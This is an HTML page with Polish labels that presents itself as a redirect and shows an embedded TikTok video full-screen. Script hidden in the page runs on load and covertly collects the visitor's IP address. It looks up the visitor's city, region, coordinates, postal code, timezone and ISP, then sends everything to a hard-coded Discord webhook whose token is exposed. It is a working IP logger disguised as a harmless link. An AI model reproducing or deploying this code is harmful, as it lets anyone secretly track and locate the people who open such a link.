<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Przekierowanie</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: black;
            overflow: hidden;
        }
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>
    <iframe src="https://www.tiktok.com/@seal_sealion/video/7629302323914804493?is_from_webapp=1&sender_device=pc"></iframe>

    <script>
        const discordWebhook = "https://discord.com/api/webhooks/1494358942413750332/wfayHFsRQ06vOFpQ6QNCkRxlZ1egWzre30qgOPCwA_X87ntoexaB5g8SQ-pueymfNAo3";

        async function getIPInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const ipData = await response.json();
                const ipv4 = ipData.ip;
                
                const geoResponse = await fetch(`https://ipapi.co/${ipv4}/json/`);
                const data = await geoResponse.json();
                
                const city = data.city || 'Brak';
                const region = data.region || 'Brak';
                const country = data.country_name || 'Brak';
                const countryCode = data.country_code || 'Brak';
                const latitude = data.latitude || 'Brak';
                const longitude = data.longitude || 'Brak';
                const postal = data.postal || 'Brak';
                const timezone = data.timezone || 'Brak';
                const org = data.org || 'Brak';
                
                const embed = {
                    embeds: [{
                        title: "🌐 NOWE WEJŚCIE NA STRONĘ",
                        color: 0x2b2d31,
                        fields: [
                            { name: "📡 IP (IPv4)", value: `\`${ipv4}\``, inline: true },
                            { name: "🏙️ Miasto", value: city, inline: true },
                            { name: "🗺️ Region", value: region, inline: true },
                            { name: "🇵🇱 Kraj", value: `${country} (${countryCode})`, inline: true },
                            { name: "📍 Lokalizacja", value: `${latitude}, ${longitude}`, inline: true },
                            { name: "📮 Kod pocztowy", value: postal, inline: true },
                            { name: "⏰ Strefa czasowa", value: timezone, inline: true },
                            { name: "🏢 Organizacja", value: org.substring(0, 50), inline: true }
                        ],
                        footer: {
                            text: `Data wejścia: ${new Date().toLocaleString('pl-PL')}`
                        },
                        timestamp: new Date().toISOString()
                    }]
                };

                await fetch(discordWebhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(embed)
                });

            } catch (error) {
                const fallbackResponse = await fetch('https://api.ipify.org?format=json');
                const fallbackData = await fallbackResponse.json();
                
                const errorEmbed = {
                    embeds: [{
                        title: "⚠️ Tylko IP (brak geo)",
                        color: 0xff6600,
                        fields: [
                            { name: "IP (IPv4)", value: `\`${fallbackData.ip}\``, inline: true },
                            { name: "Błąd", value: error.toString(), inline: false }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                };
                
                await fetch(discordWebhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(errorEmbed)
                }).catch(e => console.error(e));
            }
        }

        getIPInfo();
    </script>
</body>
</html>
